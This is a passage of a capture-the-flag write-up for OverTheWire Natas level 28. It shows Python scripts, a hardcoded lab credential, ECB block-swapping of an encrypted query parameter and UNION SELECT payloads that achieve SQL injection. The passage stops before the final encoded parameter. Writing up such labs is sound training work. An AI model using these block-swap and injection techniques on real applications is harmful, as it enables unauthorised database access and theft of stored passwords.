- So this is the hardest challenge that I've encountered till now in this series
- In this challenge, we are presented with a 'Whack Computer Joke Database' that allows us to search for jokes in the database
- We are also NOT given the source code of the challenge, which might seem a bit daunting but it actually is not, as we shall see in the challenge later
- So let's dive in to solve this one :)
### The surface view
- On the surface, we are presented with the following page:
![[Pasted image 20241010202958.png]]
- We can input any search term, and it will provide us with a so called 'joke', so to test this out let's put the term 'binary' in there and see what we get:
![[Pasted image 20241010203102.png]]
- Okay so we are getting some results. The result also contains the keyword 'binary' in there. Let's try with something smaller, let's put a single 'a' in there
![[Pasted image 20241010203215.png]]
- The results have the letter 'a' in them.
- Now from our knowledge of previous challenges, these are based on SQL databases, so there must be a query like `SELECT * FROM Jokes WHERE input LIKE '%input%'` which would return our jokes from the `Jokes` table
- This opens up an attack vector for us: SQL injection. Let's dive a bit deeper into this
### Deep dive 0:
- Let's have a look at the URL that we get after passing in the queries:
```URL
http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
```
- We can see that a `query` parameter has been added with the value `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D`
- Let's put different values in the form and see what we get. I'll present a python script for this:
```python
import urllib.parse
import requests
from requests.auth import HTTPBasicAuth
import string

URL = "http://natas28.natas.labs.overthewire.org"
auth_header = HTTPBasicAuth('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
initial_request_url = f"{URL}/index.php"
charset = string.ascii_lowercase

for letter in charset:
	initial_request_body = { 'query' : letter }
	r = requests.post(initial_request_url, auth=auth_header, data=initial_request_body, allow_redirects=False)
	print(f"Character {letter}: {urllib.parse.unquote(r.headers['Location']).split('?query=')[1]}")
```
- This script goes through all the ASCII lowercase letters (essentially all English lowercase characters) and sends them into the request one by one. Upon running the script, we get the following output:
```
Character a: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
Character b: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIYiwNnSJY7KHJGU+XjuMzVvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
Character c: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKEMZKNASy09t5ooTNAbaX0vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
Character d: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKnMw6aSOWjayIcOCUAu7bVvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
Character e: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIeoxGWFgXHXykQlH86OpiMvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
Character f: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKX9Nbu3XXL5PIaYqiW14GSvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
Character g: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLV4wF7G0i3DftMhPsAyZVqvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
Character h: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIJJW40OKGV9h7fJBqf28f9vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
Character i: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLMEPlGOfuQ7a1fFtCB5a1XvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
.
.
.
and so on
```
- Now from here we start to see some interesting stuff
	- The initial part of the response is same for all the characters, that is: `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP`
	- In the end, there is an `=` (equals) sign, which hints that this string might be base64 encoded, so let's keep that in mind
	- We can also see that the ending part of every response is also same, so that also might point to something
	- Finally, if we change the query parameter to something else, like `a`, we get the following result:
	- ![[Pasted image 20241010205022.png]]
	- After performing some search online, this hints towards AES cipher, and although it is highly secure, since we are looking at blocks of text being identical, this might be the case of encryption with ECB (Electronic Code Book) mode. Details about ECB can be found [here](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB))
### Deep dive 1:
- Now as we have a small lead, we can try to figure out more about the encryption scheme. In block cipher, one of the most important details is the block size. Let's try to find that out by fuzzing the query parameter with variable length inputs. I'll present the following script to do that:
```python
import urllib.parse
import requests
from requests.auth import HTTPBasicAuth
import base64
import string

URL = "http://natas28.natas.labs.overthewire.org"
auth_header = HTTPBasicAuth('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
initial_request_url = f"{URL}/index.php"

print("Using variable lengths of strings containing 'a'...")
for i in range(100):
	initial_request_body = { 'query' : 'a' * i }
	r = requests.post(initial_request_url, auth=auth_header, data=initial_request_body, allow_redirects=False)
	response = urllib.parse.unquote(r.headers['Location']).split('?query=')[1]
	hex_response = base64.b64decode(response).hex()
	print(f"Length {i}: {hex_response}, length: {len(hex_response)}")
```
- This script makes requests with the string 'a' of variable lengths, with the length ranging from 1 to 99, which is sufficient for us to guess the block size. The following output is observed:
```text
Length 0: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2e87ff60c99ad72ccbd947e3417a90128a77e8ed1aabe0b5d05c4ffe6ac1423ab478eb1a1fe261a2c6c15061109b3feda, length: 160
Length 1: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2ab880a8f136fbeb98967891324a1b075bdfa1054ec68515cf96f2a5544591947904f4b2abf2c2d7686aa72a53151c970, length: 160
Length 2: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2b130a531bec89c705213bfa5c9667ac748799a07b1d29b5982015c9355c2e00eaded9bdbaca6a73b71b35a010d2c4c57, length: 160
Length 3: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf22f5293a63acb9fe8c7b4e824b76d6a1d9a2e2b5db6f31f19a14f75678eadaa904249b93e4dea0909479995b9c44b351a, length: 160
Length 4: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf23504a9a9675ffd614b4f1f90d284fcaa29287f3cc5479e12e66f31c863b1804756d5732dc8c770f64397158bc17a6e66, length: 160
Length 5: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c36a1f0469158a3052166146a5e3f2ecac3b871c1c448386b45cd36d9e8f72f4655149bbba2123d89d95417ea27f3a7b, length: 160
Length 6: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf24a11ffe73afd15daa05eb3c3486dcde141c098c4bacdc5ed9357564e5105dd7e64d0dcc868253692adfcbd3796d1bf8a, length: 160
Length 7: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf29fde1cef6e3f84a172633f3074fc8e186486954aea46fb93e9ab85845b4f4bd0d7ff2b725453fc294701e51f5d7c0f8e, length: 160
Length 8: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2453e0020602f4dccd50f0eb7709477c2896de90884f86108b167f8b4aea5d763917232051483e68e458fd066167b30a3, length: 160
Length 9: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf29e622686a52640595706099abcb052bba09522f301cf9d36ac7023f165948c5a9739cd90522fa7a86f95773b56f9f8c0, length: 160
Length 10: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e738a5ffb4a4500246775175ae596bbd6f34df339c69edce11f6650bbced62702, length: 160
Length 11: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eb4eda087d3c0bea2bedc1b6140b9e2ebca8cf4e610913abae39a067619204a5a, length: 160
Length 12: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39ece82a9553b65b81280fb6d3bf2900f4775fd5044fd063d26f6bb7f734b41c899, length: 160
Length 13: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e1f74714d76fcc5d464c6a221e6ed98e46223a14d9c4291b98775b03fbc73d4edd8ae51d7da71b2b083d919a0d7b88b98, length: 192
Length 14: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eecd36f8fd9164d403540e449707d27e54257a343daadaaf2c0e3a1d71ce03dd17b7baca655f298a321e90e3f7a60d4d8, length: 192
Length 15: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e5aef2a997da2363f72a3fad332d1736fa773f3185094aa01408f1f97d037d385678c5773ecc28f870e4f4ebc6c8070a4, length: 192
Length 16: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e8925158cfc5ac06d22bfda0b72c8f151a77e8ed1aabe0b5d05c4ffe6ac1423ab478eb1a1fe261a2c6c15061109b3feda, length: 192
Length 17: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eadf8a1ad0177ed1ecad3ac7c1082aa9ebdfa1054ec68515cf96f2a5544591947904f4b2abf2c2d7686aa72a53151c970, length: 192
Length 18: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e53d9499ebcad6861f04b7cdc24f3046248799a07b1d29b5982015c9355c2e00eaded9bdbaca6a73b71b35a010d2c4c57, length: 192
Length 19: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39ea549fda52b6d9b4e2632db31838856d59a2e2b5db6f31f19a14f75678eadaa904249b93e4dea0909479995b9c44b351a, length: 192
Length 20: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e2011bbe488dde1bbec961b6170b30e1229287f3cc5479e12e66f31c863b1804756d5732dc8c770f64397158bc17a6e66, length: 192
Length 21: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e8829a1f930ceb566b834441c0577402cac3b871c1c448386b45cd36d9e8f72f4655149bbba2123d89d95417ea27f3a7b, length: 192
Length 22: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e547602b52fae1566ac8e971f91f6d60541c098c4bacdc5ed9357564e5105dd7e64d0dcc868253692adfcbd3796d1bf8a, length: 192
Length 23: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39ea45a93ee4794d1b6204fb0920b68f27d6486954aea46fb93e9ab85845b4f4bd0d7ff2b725453fc294701e51f5d7c0f8e, length: 192
Length 24: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eeda118f999f9495e8f3d973fba6528a3896de90884f86108b167f8b4aea5d763917232051483e68e458fd066167b30a3, length: 192
Length 25: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39ef2909c4d53781ee1777a012bb1a72541a09522f301cf9d36ac7023f165948c5a9739cd90522fa7a86f95773b56f9f8c0, length: 192
Length 26: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eb39038c28df79b65d26151df58f7eaa3738a5ffb4a4500246775175ae596bbd6f34df339c69edce11f6650bbced62702, length: 192
Length 27: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eb39038c28df79b65d26151df58f7eaa3b4eda087d3c0bea2bedc1b6140b9e2ebca8cf4e610913abae39a067619204a5a, length: 192
Length 28: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eb39038c28df79b65d26151df58f7eaa3ce82a9553b65b81280fb6d3bf2900f4775fd5044fd063d26f6bb7f734b41c899, length: 192
Length 29: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eb39038c28df79b65d26151df58f7eaa31f74714d76fcc5d464c6a221e6ed98e46223a14d9c4291b98775b03fbc73d4edd8ae51d7da71b2b083d919a0d7b88b98, length: 224
Length 30: 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eb39038c28df79b65d26151df58f7eaa3ecd36f8fd9164d403540e449707d27e54257a343daadaaf2c0e3a1d71ce03dd17b7baca655f298a321e90e3f7a60d4d8, length: 224
...
and so on
```
- Now since each string has been converted to its hex equivalent, we need to keep in mind that each hex character shown here represents 4 bits, so the length of each string must be divided by 4 in order to get the actual length
- Here we can observe some interesting stuff:
	- The length of each response is exactly divisible by 16 (till input length 12 it is 40 bytes, till input length 28 it is 48 bytes, till input length 44 it is 56 bytes and so on)
	- Also, if we calculate the difference in input lengths whenever we observe a change in response length, it comes out to be 16 (excluding the first difference), like `44 - 28 = 16`
- So, it is highly likely that our block size is 16 bytes in length, as whenever we increase the input length by 16, our response also gets bigger
### Deep dive 2:
- Now, going forward with the assumption that the block size is 16, let's analyse a few blocks in order to get hold of a pattern that can help us
- Let's observe the hex responses till the input string length of 25. I will split each response in chunks of 16 bytes so that it becomes easier for us to see which blocks are changing and which are not. The following python script can help us out in that:
```python
import urllib.parse
import requests
from requests.auth import HTTPBasicAuth
import base64

URL = "http://natas28.natas.labs.overthewire.org"
auth_header = HTTPBasicAuth('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

initial_request_url = f"{URL}/index.php"

count = 1
while (count <= 25):
	initial_query = "a" * count
	initial_request_body = { 'query' : initial_query }
	r = requests.post(initial_request_url, auth=auth_header, data=initial_request_body, allow_redirects=False)
	location_redirect_param = urllib.parse.unquote(r.headers['Location']).split("?query=")[1]
	decoded_hex = base64.b64decode(location_redirect_param).hex()
	(chunks, chunk_size) = (len(decoded_hex), 32)
	print(f"{count}a")
	for i in range(0, chunks, chunk_size):
		print(f"{i//32}: {decoded_hex[i: i+chunk_size]}")
	print("------------------------------------------")
	count += 1
```
- This script just splits each of the responses into fixed size chunks (of size 32 bits), and prints them with some good line numbering and formatting, as follows:
```
1a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: ab880a8f136fbeb98967891324a1b075
3: bdfa1054ec68515cf96f2a5544591947
4: 904f4b2abf2c2d7686aa72a53151c970
------------------------------------------
2a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: b130a531bec89c705213bfa5c9667ac7
3: 48799a07b1d29b5982015c9355c2e00e
4: aded9bdbaca6a73b71b35a010d2c4c57
------------------------------------------
3a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: 2f5293a63acb9fe8c7b4e824b76d6a1d
3: 9a2e2b5db6f31f19a14f75678eadaa90
4: 4249b93e4dea0909479995b9c44b351a
------------------------------------------
4a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: 3504a9a9675ffd614b4f1f90d284fcaa
3: 29287f3cc5479e12e66f31c863b18047
4: 56d5732dc8c770f64397158bc17a6e66
------------------------------------------
5a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c36a1f0469158a3052166146a5e3f2ec
3: ac3b871c1c448386b45cd36d9e8f72f4
4: 655149bbba2123d89d95417ea27f3a7b
------------------------------------------
6a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: 4a11ffe73afd15daa05eb3c3486dcde1
3: 41c098c4bacdc5ed9357564e5105dd7e
4: 64d0dcc868253692adfcbd3796d1bf8a
------------------------------------------
7a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: 9fde1cef6e3f84a172633f3074fc8e18
3: 6486954aea46fb93e9ab85845b4f4bd0
4: d7ff2b725453fc294701e51f5d7c0f8e
------------------------------------------
8a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: 453e0020602f4dccd50f0eb7709477c2
3: 896de90884f86108b167f8b4aea5d763
4: 917232051483e68e458fd066167b30a3
------------------------------------------
9a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: 9e622686a52640595706099abcb052bb
3: a09522f301cf9d36ac7023f165948c5a
4: 9739cd90522fa7a86f95773b56f9f8c0
------------------------------------------
10a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: 738a5ffb4a4500246775175ae596bbd6
4: f34df339c69edce11f6650bbced62702
------------------------------------------
11a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: b4eda087d3c0bea2bedc1b6140b9e2eb
4: ca8cf4e610913abae39a067619204a5a
------------------------------------------
12a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: ce82a9553b65b81280fb6d3bf2900f47
4: 75fd5044fd063d26f6bb7f734b41c899
------------------------------------------
13a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: 1f74714d76fcc5d464c6a221e6ed98e4
4: 6223a14d9c4291b98775b03fbc73d4ed
5: d8ae51d7da71b2b083d919a0d7b88b98
------------------------------------------
14a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: ecd36f8fd9164d403540e449707d27e5
4: 4257a343daadaaf2c0e3a1d71ce03dd1
5: 7b7baca655f298a321e90e3f7a60d4d8
------------------------------------------
15a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: 5aef2a997da2363f72a3fad332d1736f
4: a773f3185094aa01408f1f97d037d385
5: 678c5773ecc28f870e4f4ebc6c8070a4
------------------------------------------
16a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: 8925158cfc5ac06d22bfda0b72c8f151
4: a77e8ed1aabe0b5d05c4ffe6ac1423ab
5: 478eb1a1fe261a2c6c15061109b3feda
------------------------------------------
17a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: adf8a1ad0177ed1ecad3ac7c1082aa9e
4: bdfa1054ec68515cf96f2a5544591947
5: 904f4b2abf2c2d7686aa72a53151c970
------------------------------------------
18a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: 53d9499ebcad6861f04b7cdc24f30462
4: 48799a07b1d29b5982015c9355c2e00e
5: aded9bdbaca6a73b71b35a010d2c4c57
------------------------------------------
19a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: a549fda52b6d9b4e2632db31838856d5
4: 9a2e2b5db6f31f19a14f75678eadaa90
5: 4249b93e4dea0909479995b9c44b351a
------------------------------------------
20a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: 2011bbe488dde1bbec961b6170b30e12
4: 29287f3cc5479e12e66f31c863b18047
5: 56d5732dc8c770f64397158bc17a6e66
------------------------------------------
21a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: 8829a1f930ceb566b834441c0577402c
4: ac3b871c1c448386b45cd36d9e8f72f4
5: 655149bbba2123d89d95417ea27f3a7b
------------------------------------------
22a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: 547602b52fae1566ac8e971f91f6d605
4: 41c098c4bacdc5ed9357564e5105dd7e
5: 64d0dcc868253692adfcbd3796d1bf8a
------------------------------------------
23a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: a45a93ee4794d1b6204fb0920b68f27d
4: 6486954aea46fb93e9ab85845b4f4bd0
5: d7ff2b725453fc294701e51f5d7c0f8e
------------------------------------------
24a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: eda118f999f9495e8f3d973fba6528a3
4: 896de90884f86108b167f8b4aea5d763
5: 917232051483e68e458fd066167b30a3
------------------------------------------
25a
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: f2909c4d53781ee1777a012bb1a72541
4: a09522f301cf9d36ac7023f165948c5a
5: 9739cd90522fa7a86f95773b56f9f8c0
------------------------------------------

```
- Now we can observe that in every scenario, the block 0 and 1 are unchanged, which means that there must be some fixed query that must be present inside that
- Also, once we reach 10 'a's, the block 2 becomes constant, which means that it gets completely filled and the rest of the blocks start to change. Each block becomes constant once it gets completely filled with 'a'. This would be a useful property that will help us
### Deep dive 3
- Finally, we need to have a look at the special characters that we will have to use in our SQL injection. Let's try out a single quote (')
![[Pasted image 20241011113436.png]]
- We get an output that contains single quotes ('), so this means that special characters are being escaped (maybe like \\'), and we will have to take care of that as well
### Planning the attack
- Now with some information at our disposal, let's try to think of the attack
- We know that the block size is 16, and the first two blocks are constant, so we need to modify the third block onwards for our attack
- We also know that our single quote (') will be escaped by something like \\', so we need to somehow remove that escape sequence and fit in our malicious query
- In this challenge, we can only swap out blocks since we don't know what the encryption key is, therefore if we want to remove the escaping sequence we can only do that on the edge of the block wherein half of the escape sequence lies in one block, and the other half lies in another block, then we can swap out the initial half with a good one that will remove the escape character
- In order to understand this better, let's have a look at the third block that gets filled with 10 'a's
- It might look like this:
```
xxxxxxaaaaaaaaaa
```
- The 'x's denote something that we don't know, and the remaining 10 characters are filled up by 'a's
- Now, if we remove one 'a' from the end and instead insert a single quote, the block would look like this:
```
xxxxxxaaaaaaaaa'
```
- However, this would be escaped and the single quote would be pushed on to the next block, like this:
```
xxxxxxaaaaaaaaa\
'xxxxxxxxxxxxxxx
```
- But, we know how our 'good' block that is filled completely with 'a's looks like, so we can replace it instead:
```
xxxxxxaaaaaaaaaa
'xxxxxxxxxxxxxxx
```
- This is exactly what we want. Unescaped single quote that will terminate the query and will open up the possibility for SQL injection
### Preparing the attack
- Let's go ahead with the preparation of the attack now
- We know about our 'good' block that can be trusted (The one which has the block of 10 'a's)
```text
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: 738a5ffb4a4500246775175ae596bbd6
4: f34df339c69edce11f6650bbced62702
```
- We know that if we pass 10 characters in the input, the block 2 will get completely filled, so let's try out the following SQL query for test:
```
aaaaaaaaa' UNION SELECT @@version;#
```
- Initially we have put up 9 'a's, then a single quote, that will be escaped and pushed on to the next block, and we have the rest of our query that will fetch the database type and version in MySQL. We are using UNION operator as the table from which we need to fetch our password is different from the one which is being queried
- For this query, I wrote a python script as follows:
```python
import urllib.parse
import requests
from requests.auth import HTTPBasicAuth
import base64

URL = "http://natas28.natas.labs.overthewire.org"
auth_header = HTTPBasicAuth('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
initial_request_url = f"{URL}/index.php"

initial_query = "aaaaaaaaa' UNION SELECT @@version;#"
initial_request_body = { 'query' : initial_query }
r = requests.post(initial_request_url, auth=auth_header, data=initial_request_body, allow_redirects=False)
location_redirect_param = urllib.parse.unquote(r.headers['Location']).split("?query=")[1]
decoded_hex = base64.b64decode(location_redirect_param).hex()
(chunks, chunk_size) = (len(decoded_hex), 32)
for i in range(0, chunks, chunk_size):
	print(f"{i//32}: {decoded_hex[i: i+chunk_size]}")
print("------------------------------------------")
```
- We make the query and observe the output, it looks like this:
```text
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: 11dbb80ae02425dc9726bffd1803160e
3: 3e6597aa69f37bd3bf9f6f8af2ca91b1
4: aedba436bdd305b71149e5454c28d3b4
5: 29287f3cc5479e12e66f31c863b18047
6: 56d5732dc8c770f64397158bc17a6e66
------------------------------------------
```
- Now, let's replace the value of block 2 with the 'good' block that we already know, and prepare our blocks as follows:
```
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: 3e6597aa69f37bd3bf9f6f8af2ca91b1
4: aedba436bdd305b71149e5454c28d3b4
5: 29287f3cc5479e12e66f31c863b18047
6: 56d5732dc8c770f64397158bc17a6e66
------------------------------------------
```
- This block has everything same as the previous one, just the escape character being removed. Now all we need to do is to just base64 encode it, URL encode it, and pass it to our web application. We can do the preparation part in cyberchef, which gives us the following result:
```
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OePmWXqmnze9O%2Fn2%2BK8sqRsa7bpDa90wW3EUnlRUwo07QpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg%3D%3D
```
- Let's try this out in BurpSuite. We pass this result as the query parameter for `search.php`, and we get the following result:
```html
<div id="content">
<h2> Whack Computer Joke Database</h2>
<ul>
	<li>8.0.39-0ubuntu0.24.04.2</li>
</ul>
</div>
```
- This worked, which means we have successfully achieved SQL injection :)
### Executing the attack
- Finally, we can prepare our required statement and execute the attack
- We can write the following SQL query to get the password:
```
aaaaaaaaa' UNION SELECT password FROM users;#
```
- For getting the blocks, we just modify the value of `initial_query` in our previous script and make it as follows:
```python
import urllib.parse
import requests
from requests.auth import HTTPBasicAuth
import base64

URL = "http://natas28.natas.labs.overthewire.org"
auth_header = HTTPBasicAuth('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
initial_request_url = f"{URL}/index.php"

initial_query = "aaaaaaaaa' UNION SELECT password FROM users;#"
initial_request_body = { 'query' : initial_query }
r = requests.post(initial_request_url, auth=auth_header, data=initial_request_body, allow_redirects=False)
location_redirect_param = urllib.parse.unquote(r.headers['Location']).split("?query=")[1]
decoded_hex = base64.b64decode(location_redirect_param).hex()
(chunks, chunk_size) = (len(decoded_hex), 32)
for i in range(0, chunks, chunk_size):
	print(f"{i//32}: {decoded_hex[i: i+chunk_size]}")
print("------------------------------------------")
```
- Upon executing the script, we get the following blocks:
```
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: 11dbb80ae02425dc9726bffd1803160e
3: 5a73dc8bfa8ab5ed288514e439b17e4f
4: 9ba33dc1ad29f9eefe648bfecc8ba33d
5: 319b9c6dcacb763bd559feccd0293533
6: 4257a343daadaaf2c0e3a1d71ce03dd1
7: 7b7baca655f298a321e90e3f7a60d4d8
------------------------------------------
```
- We replace the block 2 with our 'good' one and prepare the new set of blocks as follows:
```
0: 1be82511a7ba5bfd578c0eef466db59c
1: dc84728fdcf89d93751d10a7c75c8cf2
2: c0872dee8bc90b1156913b08a223a39e
3: 5a73dc8bfa8ab5ed288514e439b17e4f
4: 9ba33dc1ad29f9eefe648bfecc8ba33d
5: 319b9c6dcacb763bd559feccd0293533
6: 4257a343daadaaf2c0e3a1d71ce03dd1
7: 7b7baca655f298a321e90e3f7a60d4d8
```
- Now let's paste this in cyberchef, and do all the encoding stuff that we did before to get the following query parameter:
```
